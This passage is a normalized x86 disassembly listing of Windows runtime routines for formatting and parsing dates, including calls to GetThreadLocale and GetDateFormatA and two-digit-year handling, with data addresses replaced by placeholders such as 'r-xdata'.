retn 0x8
sub_409990
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409610
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4099cc
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028d8
sub_409a10
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404210
mov edx eax
mov eax ebx
call sub_4099cc
pop ecx
pop ebx
pop ebp
retn
sub_409a30
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_4089fc
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4099cc
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409a7c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409aa8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409970
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409ae0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4096c4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409b20
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409c6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f50
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fe8
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409c75
lea eax [ ebp - 0x118 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041c0
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404210
mov edx eax
mov eax [ ebx ]
call sub_40c098
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c20c
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404470
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c1a8
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404148
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c20c
mov ecx eax
mov eax ebx
mov edx esi
call sub_404040
sub_409c88
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409d66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f50
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fe8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fe8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409d6d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041c0
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404210
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404470
sub_409d90
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a511
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a518
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f74
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c28c
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c26c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4099cc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c28c
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4099cc
pop ecx
mov al [ eax + lookup_table_409e73 ]
jmp [ eax * 4 + jump_table_409eac ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409aa8
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409aa8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409b20
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409a10
pop ecx
jmp r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409aa8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409c88
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409a10
pop ecx
jmp r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409aa8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a7c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409ae0
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409ae0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409ae0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409a7c
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409a7c
pop ecx
push ebp
call sub_409ae0
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409ae0
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408858
test eax eax
jne r-xdata
push ebp
call sub_409a7c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d90
pop ecx
push ebp
call sub_409ae0
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409a30
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409a30
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409a30
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409aa8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409a30
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409a30
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409a30
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d90
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d90
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409a30
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408858
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_4099cc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d90
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4099cc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4099cc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a10
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409990
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a10
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408858
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_4099cc
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_4099cc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a10
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409990
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a10
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c28c
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408858
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_4099cc
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d90
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409a30
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408858
test eax eax
jne r-xdata
push ebp
call sub_409aa8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409990
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a10
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a10
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a10
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c28c
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d90
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4099cc
pop ecx
jmp r-xdata
push ebp
call sub_409aa8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409990
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a10
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408858
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408858
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408858
test eax eax
jne r-xdata
jmp r-xdata
sub_40a544
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409d90
pop ecx
push ebp
mov eax ebx
call sub_409d90
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404040
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a5b4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404210
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a5d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a5b4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404210
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a66c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a6e5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a6ec
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a5b4
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404210
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404470
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407edc
test eax eax
jne r-xdata
mov eax edi
call sub_404210
add [ esi ] eax
mov bl 0x1
sub_40a6f8
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a5b4
mov eax esi
call sub_404210
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a730
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404210
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a77c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404210
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c2d0
mov [ ebx ] eax
jmp r-xdata
sub_40a7c4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404410
push eax
mov eax [ ebx ]
call sub_404410
pop edx
call sub_40c3b8
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a818
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_4099b8
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a874
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ab8f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a730
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c380
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a5d8
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a77c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404470
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407f4c
mov eax [ ebp - 0x1c ]
call sub_40a7c4
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab96
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f74
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6f8
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a5d8
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6f8
test al al
je r-xdata
call sub_4099b8
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a5d8
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_40975c
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404554
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a6f8
mov edx ebx
mov eax esi
call sub_40a5b4
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404210
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a77c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a818
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a5b4
mov eax esi
call sub_404210
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_4099b8
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404210
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404470
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407edc
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404210
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404470
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407edc
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40abb8
push ebx
push esi
push edi
push ebp
